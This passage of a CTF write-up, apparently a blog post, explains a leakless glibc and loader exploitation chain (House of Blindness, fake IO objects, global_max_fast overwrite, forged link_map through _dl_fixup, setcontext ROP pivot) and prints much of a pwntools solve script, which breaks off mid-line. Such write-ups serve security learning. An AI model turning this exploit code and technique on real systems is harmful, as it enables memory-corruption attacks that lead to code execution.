+<p>For this, we can import a new complex surface by calling the surface’s associated functions. Personally, I’ll be setting up House Of Blindness to give us a similar call primitive with its argument as a pointer to a writeable buffer. I’m sure there are other ways.</p>
+
+<h2 id="uncontrolled-pointer-write-with-global_max_fast">Uncontrolled Pointer Write with <code class="highlighter-rouge">global_max_fast</code></h2>
+<p>Given that there didn’t exist a primitive to call any arbitrary <code class="highlighter-rouge">mmap</code> relative address leaklessly, there <em>certainly</em> doesn’t exist a primitive to write any <code class="highlighter-rouge">mmap</code> relative address to any <code class="highlighter-rouge">mmap</code> relative address. However, to build a ROP chain, we <em>need</em> this primitive.</p>
+
+<p>It’s a daunting task. However, let’s focus on getting more powerful primitives and working our way to this “write whatever pointer anywhere” primitive.</p>
+
+<h3 id="developing-a-malloc-primitive">Developing a <code class="highlighter-rouge">malloc</code> Primitive</h3>
+<p>An extremely common method of writing pointers in <code class="highlighter-rouge">mmap</code> relative memory is through a <code class="highlighter-rouge">global_max_fast</code> overwrite in <code class="highlighter-rouge">malloc</code>.</p>
+
+<p>In short, a pointer to a chunk will be written out of the bounds of the <code class="highlighter-rouge">fastbinY</code> array located in <code class="highlighter-rouge">main_arena</code> if <code class="highlighter-rouge">global_max_fast</code> is larger than the length of the list.</p>
+
+<p>However, we can’t call <code class="highlighter-rouge">malloc</code>! Our call primitive simply calls any function on a memory address, specifically <code class="highlighter-rouge">&amp;_dl_load_lock</code> with House Of Blindness, rather than a constant.</p>
+
+<h3 id="faking-io-objects-with-_io_str_overflow--_io_str_finish">Faking IO Objects with <code class="highlighter-rouge">_IO_str_overflow</code> &amp; <code class="highlighter-rouge">_IO_str_finish</code></h3>
+<p>IO objects have been hot topics of exploitation for quite a while now. Due to their complexity, they act as powerful attack surfaces.</p>
+
+<p>The allocation and deallocation of internal buffers will act as our <code class="highlighter-rouge">malloc</code> and <code class="highlighter-rouge">free</code> primitives.</p>
+
+<p><code class="highlighter-rouge">_IO_str_overflow</code> reallocates an IO buffer if <code class="highlighter-rouge">_IO_write_ptr</code> exceeds <code class="highlighter-rouge">_IO_buf_end</code>, a condition called a “string overflow”. It simply doubles the old size of the buffer, with an extra 100 bytes as padding.</p>
+
+<p>Turning this behavior into a controlled <code class="highlighter-rouge">malloc</code> primitive is self-explanatory after viewing the solve script.</p>
+
+<p><code class="highlighter-rouge">_IO_str_finish</code> simply frees the allocated buffer, then nulls it out.</p>
+
+<p>From here, we can perform a standard <code class="highlighter-rouge">global_max_fast</code> attack. It’s worth noting that the size typically will be so large that the pointers written by <code class="highlighter-rouge">free</code> will be <code class="highlighter-rouge">mmap</code> relative, meaning we can control their contents with our byte write.</p>
+
+<p>However, these pointers are <em>before</em> GLIBC in memory, so we can’t write pointers into the contents of our written pointers. This will be relevant later.</p>
+
+<h2 id="forging-a-fake-link-map-for-arbitrary-pointer-write-by-rehitting-_dl_fixup">Forging a Fake Link Map for Arbitrary Pointer Write by Rehitting <code class="highlighter-rouge">_dl_fixup</code></h2>
+<p>In our quest to gain an arbitrary pointer write primitive, <code class="highlighter-rouge">_dl_fixup</code> stands out. The nature of <code class="highlighter-rouge">_dl_fixup</code> is to resolve a symbol and write it to a resolution address. By asking the two questions “How does <code class="highlighter-rouge">_dl_fixup</code> know where <code class="highlighter-rouge">write</code> is in GLIBC?” or “How does <code class="highlighter-rouge">_dl_fixup</code> know where <code class="highlighter-rouge">write@got</code> is located?”, we’ll be able to gain our arbitrary pointer write.</p>
+
+<p>Both the symbol’s address and the resolution address are specified by offsets rather than absolute pointers, so, if we could forge a link map that described the resolution of a symbol with an arbitrary location and arbitrary resolution address, we’d have arbitrary pointer write!</p>
+
+<p>Forging a valid link map that <code class="highlighter-rouge">_dl_fixup</code> can understand is by no means easy. <code class="highlighter-rouge">struct link_map</code> is the most complex structure in <code class="highlighter-rouge">ld.so</code>, with hundreds of entries.</p>
+
+<p>Luckily, <code class="highlighter-rouge">_dl_fixup</code> only uses a handful. And, if we mark our symbol as a “local” symbol in the fake symbol table, it’ll use even less. We’ll talk about local symbols in a second, but first, let’s try to forge a link map.</p>
+
+<h3 id="forging-l_info-with-pointer-writes">Forging <code class="highlighter-rouge">l_info</code> with Pointer Writes</h3>
+<p>As a reminder, <code class="highlighter-rouge">l_info</code> is an array of pointers to <code class="highlighter-rouge">Elf64_Dyn</code> entries, which, themselves, contain pointers to their associated resources. Here are the <code class="highlighter-rouge">Elf64_Dyn</code> that is used by <code class="highlighter-rouge">_dl_fixup</code>.</p>
+
+<p>Much, much, more is used by <code class="highlighter-rouge">_dl_lookup_symbol_x</code>, which <code class="highlighter-rouge">_dl_fixup</code> calls if the symbol is globally located, but, for us, those aren’t relevant.</p>
+
+<p><img src="https://i.imgur.com/QvGaqmj.png" alt="" /></p>
+
+<p>This process is confusing. Because there are double references to different pointers and link maps are by nature complex, there will be a diagram at the end to show you what the fake link map looks like.</p>
+
+<p>For local symbols, <code class="highlighter-rouge">strtab</code> and <code class="highlighter-rouge">pltgot</code> aren’t referenced. However, they still need to be valid pointers since the <code class="highlighter-rouge">D_PTR</code> macro will fetch the actual resource by dereferencing the <code class="highlighter-rouge">Elf64_Dyn</code>. With our pointer write primitive, we can just set both of them to dereferenceable, although invalid, <code class="highlighter-rouge">Elf64_Dyn</code> entries.</p>
+
+<p><code class="highlighter-rouge">l_info[DT_JMPREL]</code>, on the other hand, needs to be a pointer to a valid <code class="highlighter-rouge">Elf64_Dyn</code> which points to our fake relocation table. Our fake relocation table will contain a <code class="highlighter-rouge">r_offset</code> which can be set arbitrarily to specify <em>where</em> the resolution address is in memory relative to our fake link map’s <code class="highlighter-rouge">l_addr</code>.</p>
+
+<p>Luckily, <code class="highlighter-rouge">l_info[DT_JMPREL]</code> is already a pointer! It’s just chance that the buffer House of Blindness provides contains a pointer at that specific offset. We can modify the LSB of this pointer to make <code class="highlighter-rouge">l_info[DT_JMPREL]</code> a pointer to a bit before the global offset table.</p>
+
+<p>From there, we can use our pointer write primitive to set the value of this <code class="highlighter-rouge">Elf64_Dyn</code> to a place we can write the contents to. This lets us forge the relocation table, allowing us to specify where we can write our pointer!</p>
+
+<p>This is conceptually pretty confusing, so take a look at the solve script.</p>
+
+<p><img src="https://i.imgur.com/wcYHc6B.png" alt="" /></p>
+
+<h3 id="double-frees-and-_io_save_base">Double Frees and <code class="highlighter-rouge">_IO_save_base</code></h3>
+
+<p>Unfortunately, for specifying <em>what</em> our pointer is, we need to control the <code class="highlighter-rouge">symtab</code>, specifically <code class="highlighter-rouge">l_info[DT_SYMTAB]</code>. We aren’t as lucky as we were with <code class="highlighter-rouge">l_info[DT_JMPREL]</code>, since there isn’t already a pointer here.</p>
+
+<p>Using our pointer write primitive, we can write a valid pointer—let’s call it <code class="highlighter-rouge">symtab_dyn</code>—to <code class="highlighter-rouge">l_info[DT_SYMTAB]</code>. However, we can’t write a pointer to <code class="highlighter-rouge">symtab_dyn</code>, because of the aforementioned restriction of <code class="highlighter-rouge">mmap</code> ordering. We’ll need to get crafty.</p>
+
+<p>When we free the allocation buffer with <code class="highlighter-rouge">_IO_str_finish</code>, <code class="highlighter-rouge">_IO_buf_base</code> is nulled out, preventing a double free. However, not all references to the buffer are gone. Specifically, the ones in <code class="highlighter-rouge">_IO_read_base</code> are still very much there.</p>
+
+<p>Maybe, if we could free the stale reference to <code class="highlighter-rouge">symtab_dyn</code> in <code class="highlighter-rouge">_IO_read_base</code>, we can use <code class="highlighter-rouge">symtab_dyn</code> in a separate allocation which would use the allocation to store pointers. That way, we’d have pointers in <code class="highlighter-rouge">symtab_dyn</code>, which we could use as the reference to the fake symbol table.</p>
+
+<p>To do this, we can utilize “backup buffers” in IO objects. <code class="highlighter-rouge">_IO_switch_to_backup_area</code> swaps <code class="highlighter-rouge">_IO_read_base</code> and <code class="highlighter-rouge">_IO_save_base</code>. The reason this is so useful is that we can free <code class="highlighter-rouge">_IO_save_base</code> with <code class="highlighter-rouge">_IO_free_backup_area</code> if we set the appropriate flags. This, in essence, is a double free!</p>
+
+<h3 id="pointer-provider-__open_memstream">Pointer Provider: <code class="highlighter-rouge">__open_memstream</code></h3>
+
+<p>We won’t free <code class="highlighter-rouge">symtab_dyn</code> as is. We’ll modify its chunk header so it’s stored in <code class="highlighter-rouge">tcache</code> on <code class="highlighter-rouge">free</code>, that way the next function we call will use <code class="highlighter-rouge">symtab_dyn</code> on <code class="highlighter-rouge">malloc</code>.</p>
+
+<p>The next function we’ll call is <code class="highlighter-rouge">__open_memstream</code>. It’s not particularly complicated and was found with a little searching for functions that call <code class="highlighter-rouge">malloc</code>. All it’ll do is allocate a buffer and write the address of the <code class="highlighter-rouge">buffer+0x110</code> at <code class="highlighter-rouge">buffer+0x98</code>, plus some other boring stuff. How useful!</p>
+
+<p>We’ll modify the LSB of <code class="highlighter-rouge">l_info[DT_SYMTAB]</code> to <code class="highlighter-rouge">0x90</code>, so that way it’s <code class="highlighter-rouge">Elf64_Dyn</code> value will be <code class="highlighter-rouge">symtab_dyn+0x110</code>. Now, our fake symbol table will be located at <code class="highlighter-rouge">symtab_dyn+0x110</code>!</p>
+
+<p>Of course, we’ll top things off by writing a pointer to <code class="highlighter-rouge">l_addr</code> to make all additions to <code class="highlighter-rouge">l_addr</code> <code class="highlighter-rouge">mmap</code> relative.</p>
+
+<p>Here’s a quick diagram to make things clearer.</p>
+
+<p><img src="https://i.imgur.com/UeE1SxD.png" alt="" /></p>
+
+<p>Now, by modifying the fake relocation table and fake symbol table and calling <code class="highlighter-rouge">_dl_fixup</code>, we can adjust what and where we write our pointers, relative to <code class="highlighter-rouge">l_addr</code>!</p>
+
+<h2 id="returning-to-our-rop-chain-with-setcontext">Returning to our ROP Chain with <code class="highlighter-rouge">setcontext</code></h2>
+<p>Often in CTF, when we only get a function call but we need a ROP chain, we rely on the <code class="highlighter-rouge">setcontext</code> gadget. The specific method to return to a ROP chain can be found on <a href="https://www.willsroot.io/2020/12/yet-another-house-asis-finals-2020-ctf.html">this post</a> by another DiceGang member, FizzBuzz101, who discovered the method with poortho during ASIS CTF finals.</p>
+
+<p>In short, we chain together a <code class="highlighter-rouge">call [rbx+c]</code> gadget with <code class="highlighter-rouge">setcontext+61</code> to return to an arbitrary address. Forging the structure required for this is trivial using our relative address write primitive. This post is already <em>very</em> long, so I suggest you check the solve script and FizzBuzz101’s blog if you’d like to learn more.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>The runtime loader is filled with untapped potential for leakless exploits, considering it was built to cater to binaries that didn’t know where they were located in memory.</p>
+
+<p>This challenge was a very fun one to write and solve. I hope to see more exploitation of the runtime loader in CTF soon!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./bin/nightmare"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./lib/libc.so.6"</span><span class="p">)</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./lib/ld-linux-x86-64.so.2"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">binary</span><span class="o">=</span><span class="n">exe</span><span class="p">,</span> <span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s">"tmux"</span><span class="p">,</span> <span class="s">"splitw"</span><span class="p">,</span> <span class="s">"-v"</span><span class="p">])</span>
+
+<span class="c1"># typedef struct {
+#        Elf64_Word      st_name;
+#        unsigned char   st_info;
+#        unsigned char   st_other;
+#        Elf64_Half      st_shndx;
+#        Elf64_Addr      st_value;
+#        Elf64_Xword     st_size;
+# } Elf64_Sym;
+</span><span class="n">elf64_sym</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">Struct</span><span class="p">(</span><span class="s">"&lt;LBBHQQ"</span><span class="p">)</span>
+
+<span class="c1"># typedef struct {
+#        Elf64_Addr      r_offset;
+#        Elf64_Xword     r_info;
+#        Elf64_Sxword    r_addend;
+# } Elf64_Rela;
+</span><span class="n">elf64_rela</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">Struct</span><span class="p">(</span><span class="s">"&lt;QQq"</span><span class="p">)</span>
+
+
+<span class="k">class</span> <span class="nc">link_map</span><span class="p">:</span>
+    <span class="n">DT_JMPREL</span> <span class="o">=</span> <span class="mi">23</span>
+    <span class="n">DT_SYMTAB</span> <span class="o">=</span> <span class="mi">6</span>
+    <span class="n">DT_STRTAB</span> <span class="o">=</span> <span class="mi">5</span>
+    <span class="n">DT_VER</span> <span class="o">=</span> <span class="mi">50</span>
+    <span class="n">DT_FINI</span> <span class="o">=</span> <span class="mi">13</span>
+    <span class="n">DT_PLTGOT</span> <span class="o">=</span> <span class="mi">3</span>
+    <span class="n">DT_FINI_ARRAY</span> <span class="o">=</span> <span class="mi">26</span>
+    <span class="n">DT_FINI_ARRAYSZ</span> <span class="o">=</span> <span class="mi">28</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span>
+
+    <span class="k">def</span> <span class="nf">l_addr</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">ld</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="bp">self</span><span class="p">.</span><span class="n">offset</span>
+
+    <span class="k">def</span> <span class="nf">l_info</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tag</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">ld</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="bp">self</span><span class="p">.</span><span class="n">offset</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="n">tag</span> <span class="o">*</span> <span class="mi">8</span>
+
+    <span class="k">def</span> <span class="nf">l_init_called</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">l_addr</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x31C</span>
+
+
+<span class="k">class</span> <span class="nc">rtld_global</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span>
+
+    <span class="k">def</span> <span class="nf">_base</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">offset</span>
+
+    <span class="k">def</span> <span class="nf">_dl_load_lock</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">offset</span> <span class="o">+</span> <span class="mh">0x988</span>
+
+    <span class="k">def</span> <span class="nf">_dl_stack_used</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">offset</span> <span class="o">+</span> <span class="mh">0x988</span>
+
+    <span class="k">def</span> <span class="nf">_dl_rtld_map</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">offset</span> <span class="o">+</span> <span class="mh">0xA08</span>
+
+
+<span class="k">class</span> <span class="nc">io_obj</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span>
+
+    <span class="k">def</span> <span class="nf">_flags</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">offset</span>
+
+    <span class="k">def</span> <span class="nf">_IO_save_end</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">offset</span> <span class="o">+</span> <span class="mh">0x58</span>
+
+
+<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">DUMP</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'cat &gt; dump.txt'</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">5001</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">r</span>
+
+
+<span class="n">ld</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="mh">0x270000</span> <span class="o">-</span> <span class="mh">0x10</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="mh">0x43000</span> <span class="o">-</span> <span class="mh">0x10</span>
+
+<span class="n">binary_map</span> <span class="o">=</span> <span class="n">link_map</span><span class="p">(</span><span class="mh">0x36220</span><span class="p">)</span>
+<span class="n">ld_map</span> <span class="o">=</span> <span class="n">link_map</span><span class="p">(</span><span class="mh">0x35A48</span><span class="p">)</span>
+
+<span class="n">_rtld_global</span> <span class="o">=</span> <span class="n">rtld_global</span><span class="p">(</span><span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_rtld_global"</span><span class="p">])</span>
+
+
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="nb">bytes</span><span class="p">):</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">signed</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="n">byte</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">set_rela_table</span><span class="p">(</span><span class="n">table</span><span class="p">):</span>
+    <span class="n">write</span><span class="p">(</span>
+        <span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_r_debug"</span><span class="p">],</span>
+        <span class="n">table</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="c1"># set reloc table to _r_debug
+</span>    <span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_JMPREL</span><span class="p">),</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xB8</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">set_sym_table</span><span class="p">(</span><span class="n">table</span><span class="p">):</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_r_debug"</span><span class="p">]</span> <span class="o">+</span> <span class="n">elf64_sym</span><span class="p">.</span><span class="n">size</span> <span class="o">*</span> <span class="mi">2</span><span class="p">,</span> <span class="n">table</span><span class="p">)</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_SYMTAB</span><span class="p">),</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xB8</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">restore_rela_table</span><span class="p">():</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_JMPREL</span><span class="p">),</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xF8</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">restore_sym_table</span><span class="p">():</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_info</span><span class="p">(</span><span class="n">link_map</span><span class="p">.</span><span class="n">DT_SYMTAB</span><span class="p">),</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x88</span><span class="p">))</span>
+
+
+<span class="c1"># implements house of blindness to call a function
+</span><span class="k">def</span> <span class="nf">call_fn</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">arg</span><span class="o">=</span><span class="sa">b</span><span class="s">""</span><span class="p">):</span>
+    <span class="n">write</span><span class="p">(</span>
+        <span class="n">binary_map</span><span class="p">.</span><span class="n">l_addr</span><span class="p">(),</span>
+        <span class="n">p64</span><span class="p">(</span><span class="n">fn</span> <span class="o">-</span> <span class="n">ld</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_r_debug"</span><span class="p">],</span> <span class="n">signed</span><span class="o">=</span><span class="bp">True</span><span class="p">),</span>
+    <span class="p">)</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">_rtld_global</span><span class="p">.</span><span class="n">_dl_load_lock</span><span class="p">(),</span> <span class="n">arg</span><span class="p">)</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_init_called</span><span class="p">(),</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xFF</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">page_boundary</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">size</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
+
+
+<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="n">size</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span>
+    <span class="n">old_size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="n">size</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>
+
+    <span class="nb">file</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="n">old_size</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">old_size</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+    <span class="n">call_fn</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_str_overflow"</span><span class="p">],</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">file</span><span class="p">)[:</span><span class="mh">0x48</span><span class="p">])</span>
+    <span class="c1"># make sure __rtld_mutex_unlock goes without a hitch by setting invalid _kind
+</span>    <span class="n">write</span><span class="p">(</span><span class="n">_rtld_global</span><span class="p">.</span><span class="n">_dl_load_lock</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xFF</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">size</span>
+
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
+    <span class="n">call_fn</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_str_finish"</span><span class="p">])</span>
+
+
+<span class="c1"># global_max_fast ow implementation
+</span><span class="n">page_mem_alloc</span> <span class="o">=</span> <span class="mi">0</span>
+
+
+<span class="k">def</span> <span class="nf">gmf_size</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"main_arena"</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">-</span> <span class="mh">0x10</span>
+
+
+<span class="k">def</span> <span class="nf">ptr_write</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">page_mem_alloc</span>
+    <span class="c1"># use global_max_fast attack to overwrite
+</span>    <span class="n">write</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="n">gmf_size</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+    <span class="n">A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"global_max_fast"</span><span class="p">],</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">))</span>
+    <span class="c1"># write chunk header
+</span>    <span class="n">write</span><span class="p">(</span><span class="o">-</span><span class="n">page_boundary</span><span class="p">(</span><span class="n">A</span><span class="p">)</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="n">page_mem_alloc</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">size</span> <span class="o">|</span> <span class="mi">1</span><span class="p">))</span>
+    <span class="c1"># write fake chunk header for next check
+</span>    <span class="n">write</span><span class="p">(</span><span class="o">-</span><span class="n">page_boundary</span><span class="p">(</span><span class="n">A</span><span class="p">)</span> <span class="o">+</span> <span class="n">size</span> <span class="o">-</span> <span class="mh">0x8</span> <span class="o">-</span> <span class="n">page_mem_alloc</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x50</span><span class="p">))</span>
+    <span class="n">page_mem_alloc</span> <span class="o">+=</span> <span class="n">page_boundary</span><span class="p">(</span><span class="n">A</span><span class="p">)</span>
+    <span class="c1"># write fastbin addr
+</span>    <span class="n">free</span><span class="p">()</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"global_max_fast"</span><span class="p">],</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+    <span class="k">return</span> <span class="o">-</span><span class="n">page_mem_alloc</span>
+
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+
+<span class="c1"># ----------- loop program -----------
+# l_addr is always mmap aligned, meaning that the last three nibbles is always 000.
+# changing the lsb allows us to add some constant offset to l_addr
+# when write@got is resolved, it'll write write@libc to &amp;write@got.
+# &amp;write@got is calculated as l_addr + reloc offset, so we can
+# write@libc to &amp;exit@libc to cancel exit.
+# because of gcc optimizations, no ret is after exit. we'll slide into main,
+# which will slide into csu init. that'll call constructors, looping the process.
+</span>
+<span class="n">l_addr_offset</span> <span class="o">=</span> <span class="n">exe</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"_Exit"</span><span class="p">]</span> <span class="o">-</span> <span class="n">exe</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"write"</span><span class="p">]</span>
+<span class="n">write</span><span class="p">(</span><span class="n">binary_map</span><span class="p">.</span><span class="n">l_addr</span><span class="p">(),</span> <span class="n">p8</span><span class="p">(</span><span class="n">l_addr_offset</span><span class="p">))</span>
+
+<span class="c1"># ----------- clear version info -----------
+# version info will restrict what libraries we can load symbols from, it's a new feature in elfs
+# old elfs don't have this feature, so just need to trick ld by clearing the version info ptr
+# to remove versioning info, we need to get a static relocation that doesnt access version while we overwrite it
+</span>
+<span class="c1"># these are some dummy entires which will just write the address of _init way past the binaries GOT
+</span><span class="n">set_rela_table</span><span class="p">(</span><span class="n">elf64_rela</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x4100</span><span class="p">,</span> <span class="mh">0x200000007</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+<span class="n">set_sym_table</span><span class="p">(</span><span class="n">elf64_sym</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span>
